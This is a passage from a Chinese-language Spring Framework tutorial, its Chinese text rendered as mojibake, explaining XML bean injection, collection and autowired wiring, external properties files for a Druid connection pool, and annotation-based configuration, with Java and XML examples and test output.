</property>\n</bean>\n\n<!--Book{bname='Springå­¦ä¹ ', bauthor='<<è¥¿æ¸¸è®°>>'}-->\n```\n\n### æ³¨å…¥å¤–éƒ¨bean\n\nåœºæ™¯ï¼šserviceå±‚è°ƒç”¨daoå±‚\n\nStep1ï¼šåˆ›å»ºä¸¤ä¸ªç±» serviceç±»å’Œdaoç±»\n\n```java\npackage com.jwt.Service;\n\nimport com.jwt.dao.UserDao;\nimport com.jwt.dao.UserDaoImpl;\n\npublic class UserService {//serviceç±»\n\n    //åˆ›å»ºUserDaoç±»å‹å±æ€§ï¼Œç”Ÿæˆsetæ–¹æ³•\n    private UserDao userDao;\n    public void setUserDao(UserDao userDao) {\n        this.userDao = userDao;\n    }\n\n    public void add() {\n        System.out.println(\"service add...............\");\n        //ä¼ ç»Ÿæ–¹æ³•\n        //UserDao userDao = new UserDaoImpl();\n        //userDao.update();\n\n        this.userDao.update();//è°ƒç”¨daoæ–¹æ³•\n    }\n}\n```\n\n```java\npackage com.jwt.dao;\n\npublic interface UserDao {\n    public void update();\n}\n```\n\n```java\npackage com.jwt.dao;\n\npublic class UserDaoImpl implements UserDao {//daoç±»\n    @Override\n    public void update() {\n        System.out.println(\"dao update...........\");\n    }\n}\n\n```\n\nStep2ï¼šåœ¨springé…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®ï¼Œä½¿ç”¨å±æ€§propertyçš„refæ³¨å…¥å¤–éƒ¨å¯¹è±¡\n\n```xml\n<!--serviceå’Œdaoå¯¹è±¡åˆ›å»º-->\n<bean id=\"userService\" class=\"com.jwt.Service.UserService\">\n  <!--æ³¨å…¥userDaoå¯¹è±¡\n      nameå±æ€§ï¼šç±»é‡Œé¢çš„å±æ€§åç§°\n      refå±æ€§ï¼šåˆ›å»ºuserDaoå¯¹è±¡beanæ ‡ç­¾idå€¼\n  -->\n  <property name=\"userDao\" ref=\"userDaoImpl\"></property>\n</bean>\n<bean id=\"userDaoImpl\" class=\"com.jwt.dao.UserDaoImpl\"></bean>\n```\n\nStep3ï¼šæµ‹è¯•\n\n```java\npackage com.jwt.testdemo;\n\npublic class BeanTest {\n    @Test\n    public  void test(){\n        //1 åŠ è½½ spring é…ç½®æ–‡ä»¶\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean2.xml\");\n        //2 è·å–é…ç½®åˆ›å»ºçš„å¯¹è±¡\n        UserService userService = context.getBean(\"userService\", UserService.class);\n        userService.add();\n    }\n}\n\n/**\nservice add...............\ndao update...........\n**/\n```\n\n### æ³¨å…¥å†…éƒ¨beanå’Œçº§è”èµ‹å€¼\n\nï¼ˆ1ï¼‰ä¸€å¯¹å¤šå…³ç³»ï¼šéƒ¨é—¨å’Œå‘˜å·¥ï¼Œä¸€ä¸ªéƒ¨é—¨æœ‰å¤šä¸ªå‘˜å·¥ï¼Œä¸€ä¸ªå‘˜å·¥å±äºä¸€ä¸ªéƒ¨é—¨\nï¼ˆ2ï¼‰åœ¨å®ä½“ç±»ä¹‹é—´è¡¨ç¤ºä¸€å¯¹å¤šå…³ç³»ï¼Œå‘˜å·¥è¡¨ç¤ºæ‰€å±éƒ¨é—¨ï¼Œä½¿ç”¨å¯¹è±¡ç±»å‹å±æ€§è¿›è¡Œè¡¨ç¤º\n\nStep1ï¼šåˆ›å»ºéƒ¨é—¨å’Œå‘˜å·¥ç±»\n\n```java\npublic class Department {\n    private String dname;\n\n    public void setDname(String dname) {\n        this.dname = dname;\n    }\n\n    @Override\n    public String toString() {\n        return \"Department{\" +\n                \"dname='\" + dname + '\\'' +\n                '}';\n    }\n}\n```\n\n```java\npublic class Employee {\n    private String ename;\n    private String gender;\n    //å‘˜å·¥å±äºæŸä¸€ä¸ªéƒ¨é—¨ï¼Œä½¿ç”¨å¯¹è±¡å½¢å¼è¡¨ç¤º\n    private Department dept;\n\n    public Department getDept() {//çº§è”æ³¨å…¥ç¬¬äºŒç§éœ€è¦è¿™ä¸ªæ–¹æ³•\n        return dept;\n    }\n\n    public void setDept(Department dept) {\n        this.dept = dept;\n    }\n\n    public void setEname(String ename) {\n        this.ename = ename;\n    }\n\n    public void setGender(String gender) {\n        this.gender = gender;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee{\" +\n                \"ename='\" + ename + '\\'' +\n                \", gender='\" + gender + '\\'' +\n                \", dept=\" + dept +\n                '}';\n    }\n}\n```\n\nStep2ï¼šåœ¨ springé…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®\n\n- ç¬¬ä¸€ç§å†™æ³•ï¼šå†…éƒ¨bean(åœ¨beané‡Œé¢åµŒå¥—bean)\n\n```xml\n<bean id=\"emp\" class=\"com.jwt.ioc.Employee\">\n  <!--è®¾ç½®ä¸¤ä¸ªæ™®é€šå±æ€§-->\n  <property name=\"ename\" value=\"lucy\"></property>\n  <property name=\"gender\" value=\"å¥³\"></property>\n  <!--è®¾ç½®å¯¹è±¡ç±»å‹å±æ€§-->\n  <property name=\"dept\">\n    <bean id=\"dept\" class=\"com.jwt.ioc.Department\">\n      <property name=\"dname\" value=\"å®‰ä¿éƒ¨\"></property>\n    </bean>\n  </property>\n</bean>\n```\n\n- ç¬¬äºŒç§å†™æ³•ï¼šrefçº§è”èµ‹å€¼1\n\n```xml\n<!--çº§è”èµ‹å€¼-->\n<bean id=\"emp\" class=\"com.jwt.ioc.Employee\">\n  <!--è®¾ç½®ä¸¤ä¸ªæ™®é€šå±æ€§-->\n  <property name=\"ename\" value=\"lucy\"></property>\n  <property name=\"gender\" value=\"å¥³\"></property>\n  <!--çº§è”èµ‹å€¼-->\n  <property name=\"dept\" ref=\"dept\"></property>\n</bean>\n<bean id=\"dept\" class=\"com.jwt.ioc.Department\">\n  <property name=\"dname\" value=\"è´¢åŠ¡éƒ¨\"></property>\n</bean>\n```\n\n- ç¬¬ä¸‰ç§å†™æ³•ï¼šrefçº§è”èµ‹å€¼2\n\n```xml\n<!--çº§è”èµ‹å€¼-->\n<bean id=\"emp\" class=\"com.jwt.ioc.Employee\">\n  <!--è®¾ç½®ä¸¤ä¸ªæ™®é€šå±æ€§-->\n  <property name=\"ename\" value=\"lucy\"></property>\n  <property name=\"gender\" value=\"å¥³\"></property>\n  <!--çº§è”èµ‹å€¼-->\n  <property name=\"dept\" ref=\"dept\"></property>\n  <property name=\"dept.dname\" value=\"æŠ€æœ¯éƒ¨\"></property>\n</bean>\n<bean id=\"dept\" class=\"com.jwt.ioc.Department\">\n  <property name=\"dname\" value=\"è´¢åŠ¡éƒ¨\"></property>\n</bean>\n```\n\nStep3ï¼šæµ‹è¯•\n\n```java\npublic class BeanTest {\n\t@Test\n  public  void test2(){\n    //1 åŠ è½½ spring é…ç½®æ–‡ä»¶\n    ApplicationContext context =\n      new ClassPathXmlApplicationContext(\"bean4.xml\");\n    //2 è·å–é…ç½®åˆ›å»ºçš„å¯¹è±¡\n    Employee emp = context.getBean(\"emp\", Employee.class);\n    System.out.println(emp);\n  }\n}\n\n//å†™æ³•1ï¼šEmployee{ename='lucy', gender='å¥³', dept=Department{dname='å®‰ä¿éƒ¨'}}\n//å†™æ³•2ï¼šEmployee{ename='lucy', gender='å¥³', dept=Department{dname='è´¢åŠ¡éƒ¨'}}\n//å†™æ³•3ï¼šEmployee{ename='lucy', gender='å¥³', dept=Department{dname='æŠ€æœ¯éƒ¨'}}\n```\n\n### æ³¨å…¥é›†åˆç±»å‹å±æ€§\n\nStep1ï¼šåˆ›å»ºç±»ï¼Œå®šä¹‰æ•°ç»„ã€listã€setã€mapç±»å‹å±æ€§ï¼Œç”Ÿæˆå¯¹åº”setæ–¹æ³• \n\n```java\npackage com.jwt.ioc;\n\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class Stu {\n    //1 æ•°ç»„ç±»å‹å±æ€§\n    private String[] courses;\n    // 2 listé›†åˆç±»å‹å±æ€§\n    private List<String> list;\n    // 3 seté›†åˆç±»å‹å±æ€§\n    private Set<String> sets;\n    // 4 mapé›†åˆç±»å‹å±æ€§\n    private Map<String, String> maps;\n\n    public void setCourses(String[] courses) {\n        this.courses = courses;\n    }\n\n    public void setList(List<String> list) {\n        this.list = list;\n    }\n    \n    public void setSets(Set<String> sets) {\n        this.sets = sets;\n    }\n    \n    public void setMaps(Map<String, String> maps) {\n        this.maps = maps;\n    }\n\n    @Override\n    public String toString() {\n        return \"Stu{\" +\n                \"courses=\" + Arrays.toString(courses) +\n                \", list=\" + list +\n                \", maps=\" + maps +\n                \", sets=\" + sets +\n                '}';\n    }\n}\n```\n\nStep2ï¼šåœ¨springé…ç½®æ–‡ä»¶è¿›è¡Œé…ç½® \n\n```xml\n<bean id=\"stu\" class=\"com.jwt.ioc.Stu\">\n        <!--æ•°ç»„ç±»å‹å±æ€§æ³¨å…¥-->\n        <property name=\"courses\">\n            <array>\n                <value>Springè¯¾ç¨‹</value>\n                <value>Mybatisè¯¾ç¨‹</value>\n            </array>\n        </property>\n        <!--listç±»å‹å±æ€§æ³¨å…¥-->\n        <property name=\"list\">\n            <list>\n                <value>æµ‹è¯•1</value>\n                <value>æµ‹è¯•2</value>\n            </list>\n        </property>\n        <!--setç±»å‹å±æ€§æ³¨å…¥-->\n        <property name=\"sets\">\n            <set>\n                <value>data1</value>\n                <value>data2</value>\n            </set>\n        </property>\n        <!--mapç±»å‹å±æ€§æ³¨å…¥-->\n        <property name=\"maps\">\n            <map>\n                <entry key=\"è¯­è¨€1\" value=\"Java\"></entry>\n                <entry key=\"è¯­è¨€2\" value=\"C++\"></entry>\n            </map>\n        </property>\n</bean>\n```\n\nStep3ï¼šæµ‹è¯•\n\n```java\npublic class BeanTest {\n    @Test\n    public  void test(){\n        //1 åŠ è½½ spring é…ç½®æ–‡ä»¶\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean5.xml\");\n        //2 è·å–é…ç½®åˆ›å»ºçš„å¯¹è±¡\n        Stu stu = context.getBean(\"stu\", Stu.class);\n        System.out.println(stu);\n    }\n}\n\n//Stu{courses=[Springè¯¾ç¨‹, Mybatisè¯¾ç¨‹], list=[æµ‹è¯•1, æµ‹è¯•2], maps={è¯­è¨€1=Java, è¯­è¨€2=C++}, sets=[data1, data2]}\n```\n\n### é›†åˆæ³¨å…¥å¯¹è±¡ç±»å‹\n\nä¸€ä¸ªå­¦ç”Ÿæœ‰å¤šé—¨è¯¾ç¨‹\n\n```java\npackage com.jwt.ioc;\nimport java.util.List;\n\npublic class Stu{\n    private List<Course> courseList;\n    public void setCourseList(List<Course> courseList) {\n        this.courseList = courseList;\n    }\n\n    @Override\n    public String toString() {\n        return \"Stu{\" +\n                \"courseList=\" + courseList +\n                '}';\n    }\n}\n```\n\n```java\npackage com.jwt.ioc;\n\npublic class Course {\n    private String cname;\n    public void setCname(String cname) {\n        this.cname = cname;\n    }\n\n    @Override\n    public String toString() {\n        return \"Course{\" +\n                \"cname='\" + cname + '\\'' +\n                '}';\n    }\n}\n```\n\nåœ¨springé…ç½®æ–‡ä»¶è¿›è¡Œé…ç½® \n\n```xml\n<!--åˆ›å»ºå¤šä¸ªcourseå¯¹è±¡-->\n<bean id=\"course1\" class=\"com.jwt.ioc.Course\">\n  <property name=\"cname\" value=\"Spring5æ¡†æ¶\"></property>\n</bean>\n<bean id=\"course2\" class=\"com.jwt.ioc.Course\">\n  <property name=\"cname\" value=\"MyBatisæ¡†æ¶\"></property>\n</bean>\n\n<bean id=\"stu\" class=\"com.jwt.ioc.Stu\">\n  <!--æ³¨å…¥listé›†åˆç±»å‹ï¼Œå€¼æ˜¯å¯¹è±¡-->\n  <property name=\"courseList\">\n    <list>\n      <ref bean=\"course1\"></ref>\n      <ref bean=\"course2\"></ref>\n    </list>\n  </property>\n</bean>\n```\n\n### é›†åˆæ³¨å…¥éƒ¨åˆ†æŠ½å–æˆå…¬å…±éƒ¨åˆ†\n\n```java\npublic class Stu{\n\t\t//listé›†åˆç±»å‹å±æ€§\n    private List<String> book;\n    public void setBook(List<String> book) {\n        this.book = book;\n    }\n\n    @Override\n    public String toString() {\n        return \"Stu{\" +\n                \"book=\" + book +\n                '}';\n    }\n}\n```\n\nStep1ï¼šåœ¨springé…ç½®æ–‡ä»¶ä¸­å¼•å…¥åç§°ç©ºé—´ util \n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:util=\"http://www.springframework.org/schema/util\" <!--æ·»åŠ utilåç§°ç©ºé—´-->\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/util  http://www.springframework.org/schema/util/spring-util.xsd \"> <!--æ·»åŠ utilåç§°ç©ºé—´-->\n\n</beans>\n```\n\nStep2ï¼šä½¿ç”¨utilæ ‡ç­¾å®Œæˆlisté›†åˆæ³¨å…¥æå– \n\n```xml\n    <!--1 æå–listé›†åˆç±»å‹å±æ€§æ³¨å…¥-->\n    <util:list id=\"bookList\">\n        <value>æ˜“ç­‹ç»</value>\n        <value>ä¹é˜´çœŸç»</value>\n        <value>ä¹é˜³ç¥åŠŸ</value>\n    </util:list>\n    <!--2 æå–listé›†åˆç±»å‹å±æ€§æ³¨å…¥ä½¿ç”¨-->\n    <bean id=\"stu\" class=\"com.jwt.ioc.Stu\">\n        <property name=\"book\" ref=\"bookList\"></property>\n    </bean>\n```\n\nStep2ï¼šæµ‹è¯•\n\n```java\npublic class BeanTest {\n    @Test\n    public  void test(){\n        //1 åŠ è½½ spring é…ç½®æ–‡ä»¶\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean5.xml\");\n        //2 è·å–é…ç½®åˆ›å»ºçš„å¯¹è±¡\n        Stu stu = context.getBean(\"stu\", Stu.class);\n        System.out.println(stu);\n    }\n}\n\n//Stu{book=[æ˜“ç­‹ç», ä¹é˜´çœŸç», ä¹é˜³ç¥åŠŸ]}\n```\n\n### XMLè‡ªåŠ¨è£…é…\n\nä»€ä¹ˆæ˜¯è‡ªåŠ¨è£…é…ï¼šæ ¹æ®æŒ‡å®šè£…é…è§„åˆ™(å±æ€§åç§°æˆ–è€…å±æ€§ç±»å‹)ï¼ŒSpring è‡ªåŠ¨å°†åŒ¹é…çš„å±æ€§å€¼è¿›è¡Œæ³¨å…¥\n\nå®ç°è‡ªåŠ¨è£…é…ï¼šä½¿ç”¨ Bean æ ‡ç­¾å±æ€§ autowireï¼Œé…ç½®è‡ªåŠ¨è£…é… autowire å±æ€§å¸¸ç”¨ä¸¤ä¸ªå€¼ï¼š\n\n- byName æ ¹æ®å±æ€§åç§°æ³¨å…¥ ï¼Œæ³¨å…¥å€¼ bean çš„ id å€¼å’Œç±»å±æ€§åç§°ä¸€æ · \n- byType æ ¹æ®å±æ€§ç±»å‹æ³¨å…¥\n\n1ã€æ ¹æ®å±æ€§åç§°è‡ªåŠ¨æ³¨å…¥ \n\n```xml\n<bean id=\"empAuto\" class=\"com.jwt.ioc.Employee\" autowire=\"byName\"></bean>\n<bean id=\"deptAuto\" class=\"com.jwt.ioc.Department\"></bean>\n```\n\n2ã€æ ¹æ®å±æ€§ç±»å‹è‡ªåŠ¨æ³¨å…¥ \n\n```xml\n<bean id=\"empAuto\" class=\"com.jwt.ioc.Employee\" autowire=\"byType\"></bean>\n<bean id=\"deptAuto\" class=\"com.jwt.ioc.Department\"></bean>\n```\n\n### å¼•å…¥å¤–éƒ¨é…ç½®æ–‡ä»¶\n\n> åœºæ™¯ï¼šé…ç½® druid æ•°æ®åº“è¿æ¥æ± \n\n**æ–¹å¼ä¸€ï¼šç›´æ¥é…ç½®æ•°æ®åº“ä¿¡æ¯**\n\n1ã€å¼•å…¥Druidè¿æ¥æ± ä¾èµ– jar åŒ…\n\nä¸‹è½½åœ°å€ï¼šhttps://repo1.maven.org/maven2/com/alibaba/druid/\n\n2ã€é…ç½®Druidï¼ˆå¾·é²ä¼Šï¼‰è¿æ¥æ± \n\n```xml\n<!--ç›´æ¥é…ç½®è¿æ¥æ± -->\n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n  <property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"></property>\n  <property name=\"url\" value=\"jdbc:mysql://localhost:3306/userDb\"></property>\n  <property name=\"username\" value=\"root\"></property>\n  <property name=\"password\" value=\"root\"></property>\n</bean>\n```\n\n**æ–¹å¼äºŒï¼šå¼•å…¥å¤–éƒ¨é…ç½®æ–‡ä»¶**\n\n1ã€åˆ›å»ºå¤–éƒ¨å±æ€§æ–‡ä»¶ druid.propertiesï¼Œå†™æ•°æ®åº“ä¿¡æ¯\n\n```properties\nprop.driverClass=com.mysql.jdbc.Driver\nprop.url=jdbc:mysql://localhost:3306/dbname\nprop.username=root\nprop.password=root\n```\n\n2ã€å¼•å…¥ context åç§°ç©ºé—´\n\n `xmlns:context=\"http://www.springframework.org/schema/context\"å’Œhttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\">\n\n</beans>\n```\n\n3ã€æŠŠå¤–éƒ¨ properties å±æ€§æ–‡ä»¶å¼•å…¥åˆ° Spring é…ç½®æ–‡ä»¶ä¸­ ï¼Œ`${}`å–å€¼\n\n```xml\n<!--å¼•å…¥å¤–éƒ¨å±æ€§æ–‡ä»¶--> \n<context:property-placeholder location=\"classpath:druid.properties\"/>\n<!--é…ç½®è¿æ¥æ± --> \n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n  <property name=\"driverClassName\" value=\"${prop.driverClass}\"></property>\n  <property name=\"url\" value=\"${prop.url}\"></property>\n  <property name=\"username\" value=\"${prop.userName}\"></property>\n  <property name=\"password\" value=\"${prop.password}\"></property>\n</bean>\n```\n\n## åŸºäºæ³¨è§£æ–¹å¼\n\n### ä»€ä¹ˆæ˜¯æ³¨è§£ \n\n- æ³¨è§£æ˜¯ä»£ç ç‰¹æ®Šæ ‡è®°ï¼Œæ ¼å¼ï¼š@æ³¨è§£åç§°(å±æ€§åç§°=å±æ€§å€¼, å±æ€§åç§°=å±æ€§å€¼...) \n- ä½¿ç”¨æ³¨è§£ï¼Œæ³¨è§£ä½œç”¨åœ¨ç±»ä¸Šé¢ï¼Œæ–¹æ³•ä¸Šé¢ï¼Œå±æ€§ä¸Šé¢ \n- ä½¿ç”¨æ³¨è§£ç›®çš„ï¼šç®€åŒ–xmlé…ç½® \n\n###  Spring æä¾›æ³¨è§£\n\n- @Component \n- @Service \n- @Controller\n- @Repository\n\n ä¸Šé¢å››ä¸ªæ³¨è§£åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½å¯ä»¥ç”¨æ¥åˆ›å»ºbeanå®ä¾‹ \n\n@Serviceä¸€èˆ¬ç”¨åœ¨serviceå±‚ï¼Œ@Controllerä¸€èˆ¬ç”¨åœ¨webå±‚ï¼Œ@Repositoryä¸€èˆ¬ç”¨åœ¨daoå±‚\n\n### åŸºäºæ³¨è§£æ–¹å¼åˆ›å»ºå¯¹è±¡\n\nStep1ï¼šå¼•å…¥ä¾èµ– `spring-aop-5.3.18.jar`\n\nStep2ï¼šå¼€å¯ç»„ä»¶æ‰«æ\n\n- å¦‚æœæ‰«æå¤šä¸ªåŒ…ï¼Œå¤šä¸ªåŒ…ä½¿ç”¨é€—å·éš”å¼€\n- æˆ–è€…æ‰«æè¯¥åŒ…çš„ä¸Šå±‚ç›®å½•ï¼ˆæ¨èï¼‰\n\n```xml\n<!--å…ˆå¼•å…¥contextåç§°ç©ºé—´-->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\">\n\n</beans>\n\n<!--å†å¼€å¯ç»„ä»¶æ‰«æ-->\n<context:component-scan base-package=\"com.jwt.annotation\"/>\n```\n\nStep3ï¼šåˆ›å»ºç±»ï¼Œåœ¨ç±»ä¸Šé¢æ·»åŠ åˆ›å»ºå¯¹è±¡æ³¨è§£ \n\n```java\n@Service(value = \"userService\")\npublic class UserService {\n    public void add() {\n        System.out.println(\"annotation service add ...\");\n    }\n}\n```\n\nåœ¨æ³¨è§£é‡Œé¢ value å±æ€§å€¼å¯ä»¥çœç•¥ä¸å†™ï¼Œ**é»˜è®¤å€¼æ˜¯ç±»åç§°ï¼Œé¦–å­—æ¯å°å†™**å³`UserService-->userService`\n\næ³¨è§£é…ç½®ç­‰åŒxmlè¿™æ®µé…ç½®`<bean id=\"userService\" class=\"...\">`\n\n### ç»„ä»¶æ‰«æé…ç½®\n\n```xml\n<!--å¼€å¯ç»„ä»¶æ‰«æ-->\n<context:component-scan base-package=\"com.jwt\"/>\n```\n\nä¸Šé¢è¡¨ç¤ºä¼šæ‰« base-package ä¸‹çš„æ‰€æœ‰æ³¨è§£ï¼Œå¦‚ä½•é…ç½®åœ¨ base-package ä¸‹å“ªäº›ç±»æ‰«æï¼Œå“ªäº›ç±»ä¸æ‰«æï¼Ÿ\n\né…ç½®ç»„ä»¶æ‰«æé…ç½®çš„å‚æ•°ï¼š\n\n- use-default-filters=\"false\"  è¡¨ç¤ºç°åœ¨ä¸ä½¿ç”¨é»˜è®¤ filterï¼Œé‡‡ç”¨è‡ªå·±é…ç½® filter\n\n- context:include-filter  è®¾ç½®æ‰«æå“ªäº›å†…å®¹ \n\n- context:exclude-filter  è®¾ç½®å“ªäº›å†…å®¹ä¸è¿›è¡Œæ‰«æ \n\n1ã€åªæ‰«æ base-packageä¸‹å¸¦ Controller çš„æ³¨è§£\n\n```xml\n<context:component-scan base-package=\"com.jwt\" use-default-filters=\"false\">\n    <context:include-filter type=\"annotation\"\n                            expression=\"org.springframework.stereotype.Controller\"/>\n</context:component-scan>\n\n```\n\n2ã€ä¸æ‰«æ base-package ä¸‹å¸¦ Controller çš„æ³¨è§£\n\n```xml\n<context:component-scan base-package=\"com.jwt\">\n    <context:exclude-filter type=\"annotation\"\n                            expression=\"org.springframework.stereotype.Controller\"/>\n</context:component-scan>\n```\n\n### åŸºäºæ³¨è§£æ–¹å¼æ³¨å…¥å±æ€§\n\n- **@Autowiredï¼šæ ¹æ®å±æ€§ç±»å‹è¿›è¡Œè‡ªåŠ¨è£…é…**\n\nStep1ï¼šæŠŠserviceå’Œdaoå¯¹è±¡åˆ›å»ºï¼Œåœ¨serviceå’Œdaoç±»æ·»åŠ åˆ›å»ºå¯¹è±¡æ³¨è§£\n\n```java\n@Service(value = \"userService\")\npublic class UserService {\n    public void add() {\n        System.out.println(\"annotation service add ...\");\n    }\n}\n\n\n@Repository(value = \"userDao\")\npublic class UserDao {\n    public void add() {\n        System.out.println(\"annotation dao add...\");\n    }\n}\n\n```\n\nStep2ï¼šåœ¨serviceæ³¨å…¥daoå¯¹è±¡ï¼Œåœ¨serviceç±»æ·»åŠ daoç±»å‹å±æ€§ï¼Œåœ¨å±æ€§ä¸Šé¢ä½¿ç”¨æ³¨è§£ \n\n```java\n@Service(value = \"userService\")\npublic class UserService {\n    // æ³¨å…¥userDaoå¯¹è±¡\n    @Autowired\n    private UserDao userDao;//ä¸éœ€è¦æ·»åŠ setæ–¹æ³•\n\n    public void add() {\n        userDao.add();//è°ƒç”¨daoæ–¹æ³•\n        System.out.println(\"annotation service add ...\");\n    }\n}\n```\n\nStep3ï¼šæµ‹è¯•\n\n```java\n@Test\npublic  void test(){\n  //1 åŠ è½½ spring é…ç½®æ–‡ä»¶\n  ApplicationContext context =\n    new ClassPathXmlApplicationContext(\"bean.xml\");\n  //2 è·å–é…ç½®åˆ›å»ºçš„å¯¹è±¡\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  System.out.println(userService);\n  userService.add();\n}\n\n/**\ncom.jwt.annotation.UserService@12d4bf7e\nannotation dao add...\nannotation service add ...\n**/\n```\n\n- **@Qualifierï¼šæ ¹æ®åç§°è¿›è¡Œæ³¨å…¥**\n\nè¿™ä¸ª @Qualifier æ³¨è§£çš„ä½¿ç”¨ï¼Œå’Œä¸Šé¢@Autowired ä¸€èµ·ä½¿ç”¨\n\nä½¿ç”¨åœºæ™¯ï¼šç”±äº@Autowiredæ³¨è§£æ˜¯æŒ‰ç…§å±æ€§ç±»å‹è¿›è¡Œæ³¨å…¥ï¼Œå¦‚æœ bean å®¹å™¨ä¸­æœ‰å¤šä¸ªåŒä¸€ç±»å‹çš„å®ä¾‹å¯¹è±¡ï¼Œå°±éœ€è¦ä½¿ç”¨ @Qualifier æ ¹æ®å®ä¾‹åç§°æŒ‡å®šæ³¨å…¥å“ªä¸€ä¸ªå®ä¾‹å¯¹è±¡\n\n```java\n@Autowired //æ ¹æ®ç±»å‹è¿›è¡Œæ³¨å…¥\n@Qualifier(value = \"userDaoImpl1\")//æ ¹æ®åç§°è¿›è¡Œæ³¨å…¥\nprivate UserDao userDao;\n```\n\n- **@Resourceï¼šå¯ä»¥æ ¹æ®ç±»å‹æ³¨å…¥ï¼Œä¹Ÿå¯ä»¥æ ¹æ®åç§°æ³¨å…¥(javaxæ‰©å±•åŒ…ä¸­çš„æ³¨è§£)**\n\n```java\nimport javax.annotation.Resource;\n\n@Resource(name = \"userDaoImpl1\")\nprivate UserDao userDao;\n```\n\n- **@Valueï¼šæ³¨å…¥æ™®é€šç±»å‹å±æ€§**\n\n```java\n@Value(value = \"å°æ˜\")\nprivate String name;\n```\n\n### å®Œå…¨æ³¨è§£å¼€å‘\n\nStep1ï¼šåˆ›å»ºé…ç½®ç±»ï¼Œæ›¿ä»£ xml é…ç½®æ–‡ä»¶\n\n- `@Configuration`: ä½œä¸ºé…ç½®ç±» æ›¿ä»£xmlé…ç½®æ–‡ä»¶\n\n- `@ComponentScan`: å¼€å¯ç»„ä»¶æ‰«æ\n\n```java\n@Configuration\n@ComponentScan(basePackages = {\"com.jwt\"})\npublic class SpringConfig {\n}\n```\n\nStep2ï¼šç¼–å†™æµ‹è¯•ç±»\n\nä½¿ç”¨`AnnotationConfigApplicationContext`åŠ è½½é…ç½®ç±»\n\n```java\n@Test\npublic void test() {\n  AnnotationConfigApplicationContext context = \n    new AnnotationConfigApplicationContext(SpringConfig.class);\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  System.out.println(userService);\n  userService.add();\n}\n\n/**\ncom.jwt.annotation.UserService@6580cfdd\nannotation dao add...\nannotation service add ...\n**/\n```\n\n### **æ³¨è§£æ ¼å¼å’ŒXMLæ ¼å¼æ··ç”¨**\n\nç”±äºæ—©èµ·å¼€å‘çš„ç³»ç»Ÿå¤§éƒ¨åˆ†éƒ½æ˜¯é‡‡ç”¨xmlçš„å½¢å¼é…ç½®beanï¼Œç°åœ¨çš„ä¼ä¸šçº§å¼€å‘åŸºæœ¬ä¸Šä¸ç”¨è¿™ç§æ¨¡å¼äº†ã€‚ä½†æ˜¯å¦‚æœä½ ç‰¹åˆ«å¹¸è¿ï¼Œéœ€è¦åŸºäºä¹‹å‰çš„ç³»ç»Ÿè¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œè¿™å°±å°´å°¬äº†ã€‚æ–°å¼€å‘ç”¨æ³¨è§£æ ¼å¼ï¼Œä¹‹å‰å¼€å‘çš„æ˜¯xmlæ ¼å¼ã€‚è¿™ä¸ªæ—¶å€™å¯ä¸æ˜¯è®©ä½ é€‰æ‹©ç”¨å“ªç§æ¨¡å¼çš„ï¼Œè€Œæ˜¯ä¸¤ç§è¦åŒæ—¶ä½¿ç”¨ã€‚springæä¾›äº†ä¸€ä¸ªæ³¨è§£å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ`@ImportResource`ï¼Œåœ¨é…ç½®ç±»ä¸Šç›´æ¥å†™ä¸Šè¦è¢«èåˆçš„xmlé…ç½®æ–‡ä»¶åå³å¯ï¼Œç®—çš„ä¸Šä¸€ç§å…¼å®¹æ€§è§£å†³æ–¹æ¡ˆï¼Œæ²¡å•¥å®é™…æ„ä¹‰ã€‚\n\n```java\n@Configuration\n@ImportResource(\"applicationContext1.xml\")\npublic class SpringConfig {\n}\n```\n\n### proxyBeanMethodså±æ€§\n\nå‰é¢ç”¨åˆ°äº†@Configurationè¿™ä¸ªæ³¨è§£ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨AnnotationConfigApplicationContextåŠ è½½é…ç½®ç±»çš„æ—¶å€™ï¼Œé…ç½®ç±»å¯ä»¥ä¸æ·»åŠ è¿™ä¸ªæ³¨è§£ã€‚ä½†æ˜¯è¿™ä¸ªæ³¨è§£æœ‰ä¸€ä¸ªæ›´åŠ 